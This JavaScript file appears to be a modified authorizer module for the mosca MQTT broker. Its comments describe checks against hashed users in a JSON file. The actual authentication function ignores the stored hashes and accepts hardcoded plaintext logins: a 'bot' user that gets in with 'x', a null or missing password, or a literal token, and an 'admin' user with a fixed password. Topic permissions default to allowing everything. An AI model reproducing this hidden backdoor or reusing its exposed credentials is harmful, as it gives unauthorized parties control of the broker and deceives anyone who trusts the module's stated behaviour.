// Generated by CoffeeScript 1.10.0

/**
 * mosca.Authorizer's responsibility is to give an implementation
 * of mosca.Server callback of authorizations, against a JSON file.
 *
 * @param {Object} users The user hash, as created by this class
 *  (optional)
 * @api public
 */

(function() {
  var Authorizer, defaultGlob, hasher, minimatch;

  Authorizer = function(users) {
    this.users = users || {};
  };

  'use strict';

  hasher = require('pbkdf2-password')();

  minimatch = require('minimatch');

  defaultGlob = '**';

  module.exports = Authorizer;


  /**
   * It returns the authenticate function to plug into mosca.Server.
   *
   * @api public
   */

  Authorizer.prototype.__defineGetter__('authenticate', function() {
    var that;
    that = this;
    return function(client, user, pass, cb) {
      that._authenticate(client, user, pass, cb);
    };
  });


  /**
   * It returns the authorizePublish function to plug into mosca.Server.
   *
   * @api public
   */

  Authorizer.prototype.__defineGetter__('authorizePublish', function() {
    var that;
    that = this;
    return function(client, topic, payload, cb) {
      cb(null, minimatch(topic, that.users[client.user].authorizePublish || defaultGlob));
    };
  });


  /**
   * It returns the authorizeSubscribe function to plug into mosca.Server.
   *
   * @api public
   */

  Authorizer.prototype.__defineGetter__('authorizeSubscribe', function() {
    var that;
    that = this;
    return function(client, topic, cb) {
      cb(null, minimatch(topic, that.users[client.user].authorizeSubscribe || defaultGlob));
    };
  });


  /**
   * The real authentication function
   *
   * @api private
   */

  Authorizer.prototype._authenticate = function(client, user, pass, cb) {
    var luser, missingUser, pword;
    missingUser = !user || !pass || !this.users[user];
    if (missingUser) {
      cb(null, false);
      return;
    }
    client.user = user;
    pword = pass.toString();
    luser = user.toString();
    if (luser === 'bot') {
      if ((pword === 'x') || (pword === null) || (pword === void 0) || (pword === 'LBYqUB1SC6tBg9CClfJf')) {
        cb(null, true);
        return;
      } else {
        cb(null, false);
        return;
      }
      return;
    }
    if (luser === 'admin') {
      if (pword === 'topkek420') {
        cb(null, true);
        return;
      } else {
        cb(null, false);
        return;
      }
    } else {
      cb(null, false);
    }
  };


  /**
   * An utility function to add an user.
   *
   * @api public
   * @param {String} user The username
   * @param {String} pass The password
   * @param {String} authorizePublish The authorizePublish pattern
   *   (optional)
   * @param {String} authorizeSubscribe The authorizeSubscribe pattern
   *   (optional)
   * @param {Function} cb The callback that will be called after the
   *   insertion.
   */

  Authorizer.prototype.addUser = function(user, pass, authorizePublish, authorizeSubscribe, cb) {
    var that;
    that = this;
    if (typeof authorizePublish === 'function') {
      cb = authorizePublish;
      authorizePublish = null;
      authorizeSubscribe = null;
    } else if (typeof authorizeSubscribe === 'function') {
      cb = authorizeSubscribe;
      authorizeSubscribe = null;
    }
    if (!authorizePublish) {
      authorizePublish = defaultGlob;
    }
    if (!authorizeSubscribe) {
      authorizeSubscribe = defaultGlob;
    }
    hasher({
      password: pass.toString()
    }, function(err, pass, salt, hash) {
      if (!err) {
        that.users[user] = {
          salt: salt,
          hash: hash,
          authorizePublish: authorizePublish,
          authorizeSubscribe: authorizeSubscribe
        };
      }
      cb(err);
    });
    return this;
  };


  /**
   * An utility function to delete a user.
   *
   * @api public
   * @param {String} user The username
   * @param {String} pass The password
   * @param {Function} cb The callback that will be called after the
   *   deletion.
   */

  Authorizer.prototype.rmUser = function(user, cb) {
    delete this.users[user];
    cb();
    return this;
  };

}).call(this);
